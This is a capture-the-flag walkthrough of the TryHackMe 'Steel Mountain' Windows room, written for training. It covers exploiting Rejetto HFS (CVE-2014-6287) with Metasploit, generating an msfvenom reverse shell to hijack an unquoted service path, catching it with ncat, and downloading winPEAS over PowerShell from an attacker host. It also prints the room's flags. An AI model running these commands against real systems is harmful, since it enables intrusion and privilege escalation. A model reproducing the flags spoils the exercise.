# Steel Mountain.md

Room [Steel Mountain](https://tryhackme.com/room/steelmountain) on TryHackMe

<h2></h2>

<h3>Make a Directory with the Room Name in the TryHackMe Folder</h3>

- Change directory to /Desktop/Tryhackme.

`cd Desktop/Tryhackme`

- Change a new directory call "SteelMountain".

`mkdir SteelMountain`

- Change directory into SteelMountain.

`cd SteelMountain/`

<p align="center"> <img src="https://i.imgur.com/lV4jHcT.png" height="90%" width="90%" alt=""/>

<h2></h2>

<h3>Deploy the Machine</h3>

Deploy the machine by connecting to TryHackMe network. 

Temporary IP Address: [10.10.27.109]

Introduction: In this room you will enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator.

Question: Who is the employee of the month?

`Bill Harper`

Navigate to the Temporary IP [10.10.27.109].

<p align="center"> <img src="https://i.imgur.com/9e0crsp.png" height="90%" width="90%" alt=""/>

Reverse image the picture with Google.

Right click the image > Select "Search image with Google".

<p align="center"> <img src="https://i.imgur.com/ChtOCix.png" height="90%" width="90%" alt=""/>

Found the name of the person in the photo.

<p align="center"> <img src="https://i.imgur.com/I0ZlrUc.png" height="90%" width="90%" alt=""/>

#

# Initial Access: Questions

Question 1: Scan the machine with nmap. What is the other port running a web server on?

Question 2: Take a look at the other web server. What file server is running?

Question 3: What is the CVE number to exploit this file server?

Quesion 4: Use Metasploit to get an initial shell. What is the user flag?

#

<h2>Question 1</h2>

Gather the Information from the Target Machine with `Nmap` Command. Find the open ports on the machine.

On Terminal: `nmap -sC -sV -p- -oN nmap_initial.txt 10.10.27.109`

- `nmap`: This is the command used to run the Nmap tool.
- `-sC`: To perform script scanning.
- `-sV`: To detect the version of services.
- `-p-`: This flag specifies scanning all ports. The hyphen after -p indicates that Nmap should scan all 65535 ports. This can be time-consuming but thorough.
- `-oN nmap_initial.txt`: To save the scan results in a file named "nmap_initial.txt."
- The target IP address is `10.10.27.109`.

<p align="center"> <img src="https://i.imgur.com/npFTfrB.png" height="90%" width="90%" alt=""/>

Question 1: Scan the machine with nmap. What is the other port running a web server on?

`8080`

#

# Question 2

Navigate to `10.10.27.109:8080` > Click on `HttpFileServer 2.3`.

<p align="center"> <img src="https://i.imgur.com/hFeQIln.png" height="90%" width="90%" alt=""/>

From the URL, we know that the server is "Rejetto". So it's "Rejetto HTTP File Server".

<p align="center"> <img src="https://i.imgur.com/8bO2Ojw.png" height="90%" width="90%" alt=""/>

Question 2: Take a look at the other web server. What file server is running?

`Rejetto HTTP File Server`

# 

# Question 3

Google: "Rejetto Http File Server 2.3 exploit" > Click on the first link for "Exploit-DB".

<p align="center"> <img src="https://i.imgur.com/Bmq2UtO.png" height="90%" width="90%" alt=""/>

Got the CVE number.

<p align="center"> <img src="https://i.imgur.com/PTUDGAQ.png" height="90%" width="90%" alt=""/>

Question 3: What is the CVE number to exploit this file server?

`2014-6287`

#

# Question 4

Use Metasploit to get an initial shell. We will search to see what exploit does rejetoo have on metasploit have.

On Terminal: `msfconsole` 
- To open Metasploit

On Terminal: `search rejetoo` 
- To search for exploit in Metasploit that contains "rejetoo".

<p align="center"> <img src="https://i.imgur.com/GjMLHR0.png" height="90%" width="90%" alt=""/>

We will use the only exploit found. 

On Terminal: `use 0`
- Use #0 from the matching modules.

<p align="center"> <img src="https://i.imgur.com/AZijwTL.png" height="90%" width="90%" alt=""/>

We will use "show options" to show what options is there for this exploit.

On Terminal: `show options`

<p align="center"> <img src="https://i.imgur.com/nTuNsuA.png" height="90%" width="90%" alt=""/>

We see that "RHOSTS" is required. We will change that to the Target IP Address. We will also change "RPORT" and "LHOST".

On Terminal: `set RHOSTS 10.10.27.109`

On Terminal: `set RPORT 8080`
- We are setting RPORT to 8080 because we are using 8080 instead of 80.

On Terminal: `set LPORT 10.6.106.187
- We changed the LPORT to our own machine IP, [Tryhackme's OpenVAS IP].

<p align="center"> <img src="https://i.imgur.com/DssxwRq.png" height="90%" width="90%" alt=""/>

Run the exploit and get into the meterpreter.

<p align="center"> <img src="https://i.imgur.com/RXMvMPo.png" height="90%" width="90%" alt=""/>

Use search to the user flag.

On Terminal: `search -f *.txt`
- `search`: This is the command or tool used for searching. The actual search tool may vary depending on your operating system or specific software installed.
- `-f`: This is an option or flag for the search command. The -f flag could potentially indicate that you want to search for files.
- `*.txt`: This is a file pattern or wildcard expression. In this case, it's searching for files with a ".txt" extension.

Found "user.txt" to be at `c:\Users\bill\Desktop`.

<p align="center"> <img src="https://i.imgur.com/v2PSVbb.png" height="90%" width="90%" alt=""/>

Use `cat` command to read the .txt file.

On Terminal: `cat c:/Users/bill/Desktop/user.txt`

<p align="center"> <img src="https://i.imgur.com/BGGzZWb.png" height="90%" width="90%" alt=""/>

Question 4: Use Metasploit to get an initial shell. What is the user flag?

`b04763b6fcf51fcd7c13abc7db4fd365`

#

# Privilege Escalation Questions

Question 1: Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?

Question 2: What is the root flag?

#

# Question 1

Now that you have an initial shell on this Windows machine as Bill, we can further enumerate the machine and escalate our privileges to root.

To investigate this computer, we'll use a PowerShell script called PowerUp. Its job is to check a Windows machine for any issues or irregularities. PowerUp is designed to be a handy tool for finding common ways in which Windows systems might not be set up correctly, making them vulnerable to security issues.

Download the script [Here](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1).

Now we will use the upload command in Metasploit to upload the script into the target machine.

On Terminal: `upload PowerUp.ps1`
- Since we are already in Desktop/Tryhackme/Steel/Mountain.

<p align="center"> <img src="https://i.imgur.com/f0KDZJk.png" height="90%" width="90%" alt=""/>

To execute this using Meterpreter, I will type load powershell into meterpreter. Then I will enter powershell by entering powershell_shell.

On Terminal: `load powershell`
On Terminal: `powershell_shell`

<p align="center"> <img src="https://i.imgur.com/MHXJWwn.png" height="90%" width="90%" alt=""/>

We will run the PowerUp Powershell script by entering:

On Terminal: `. .\PowerUp.ps1`
On Terminal: `Invoke-Allchecks`

<p align="center"> <img src="https://i.imgur.com/pZ84T5T.png" height="90%" width="90%" alt=""/>

Question 1: Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?

`AdvancedSystemCareService9`

#

# Question 2

When CanRestart is set to true, it means we can restart a service on the system. Additionally, the directory to the application is writable, allowing us to replace the real application with our harmful one. After doing this, if we restart the service, it will run our infected program instead.

Open a new terminal, Use msfvenom to generate a reverse shell as an Windows executable.

On Terminal: `msfvenom -p windows/shell_reverse_tcp LHOST=10.6.106.187 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe`
- Generated a reverse shell with the name "ASCService.exe". (Save it in your project directory)

<p align="center"> <img src="https://i.imgur.com/kbcOXZ9.png" height="90%" width="90%" alt=""/>

Exit Powershell and upload your binary and replace the legitimate one. Then restart the program to get a shell as root.

On the meterpreter Terminal: `upload ASCService.exe`

<p align="center"> <img src="https://i.imgur.com/c9vNAjx.png" height="90%" width="90%" alt=""/>

Now, we want to swap out the real one. Go into a regular command shell from your meterpreter shell by typing: shell.

Before you copy anything, make sure to halt the service by typing:

On Terminal: `shell`

On Terminal: `sc stop AdvancedSystemCareService9`

<p align="center"> <img src="https://i.imgur.com/zFB5y4X.png" height="90%" width="90%" alt=""/>

We will copy the file to the original location:

On Terminal: `copy ASCService.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"`

<p align="center"> <img src="https://i.imgur.com/a6fZ2sQ.png" height="90%" width="90%" alt=""/>

We now will use ncat to listen. We will open a new terminal to do this:

On Terminal: `ncat -nlvp 4443`

We will restart the program to get into the shell as root.

On Terminal: `sc start AdvancedSystemCareService9`

<p align="center"> <img src="https://i.imgur.com/x5RyzpY.png" height="90%" width="90%" alt=""/>

We now have system root access. We will navigate to the Administrator Desktop to capture the root flag.

On Terminal: `cd /Users/Administrator/Desktop`

On Terminal: `dir`
- To see what files is in the directory.

<p align="center"> <img src="https://i.imgur.com/DxfW5jO.png" height="90%" width="90%" alt=""/>

We will now use the `more` command to read the root flag.

On Terminal: `more root.txt`

<p align="center"> <img src="https://i.imgur.com/kc6cie8.png" height="90%" width="90%" alt=""/>

Successfully captured the flag.

Question 2: What is the root flag?

`9af5f314f57607c00fd09803a587db80`

#

# Access and Escalation Without Metasploit Question

Question 1: What powershell -c command could we run to manually find out the service name?

*Format is "powershell -c "command here"*

#

# Question 1

Download the exploit
- Copy the raw text from: https://www.exploit-db.com/raw/39161
- into a new file called it exploit.py.

Edit the port/ip in the script
- Edit the script and add your attacker machine ip. You can leave the ip as is if you want.

Edit the port number in the script for the file server
- The payload script uses port 80 for the file web server by default. This port is often used on THM AttackBoxes and we can therefore not use it for the web server we run in step 5. We therefore add port 8000 to the ip_addr
variable. See image below.

Download a netcat static binary
- Download the netcat binary here: https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe
- It need to be renamed to nc.exe to work with the exploit script.

Serve the binary by running a Python webserver
- In the directory where you have your binary running start a simple Python web server by running: python3 -m http.server 8000

Start a listener
- Start a simply netcat listener by entering nc -lvnp 443

Run the exploit with the correct arguments
- Run this command: python2 exploit.py 10.10.13.114 8080
- This script will not work without editing with python3.

Run the exploit once more

<p align="center"> <img src="https://i.imgur.com/sbwiwlt.png" height="90%" width="90%" alt=""/>


If you've followed the steps correctly, you should have three terminal tabs open. One is for running the exploit, another for the Python HTTP server, and the third for the Netcat listener.

<p align="center"> <img src="https://i.imgur.com/AEva5Bb.png" height="90%" width="90%" alt=""/>

Great job! We're moving on to the system now. Let's use PowerShell to fetch winPEAS. Start by getting the winPEAS binary from this link (https://github.com/carlospolop/PEASS-ng/releases/tag/20220717) and set up the Python server again. Go to Bill's desktop (details below). Once there, run the following command in the PowerShell shell:

`powershell -c wget "http://<attacker ip>:8000/winPEAS.exe" -outfile "winPEAS.exe"`

<p align="center"> <img src="https://i.imgur.com/TsRTNMz.png" height="90%" width="90%" alt=""/>

After running winPeas (just type winPeas.exe), it shows us unquoted paths. It also reveals the name of the service it is currently running.

<p align="center"> <img src="https://i.imgur.com/ZfTDiNX.png" height="90%" width="90%" alt=""/>

We see the same vulnerability as we did when we used Metasploit.

Question 1: What powershell -c command could we run to manually find out the service name? *Format is “powershell -c “command here”*

`powershell -c Get-Service`



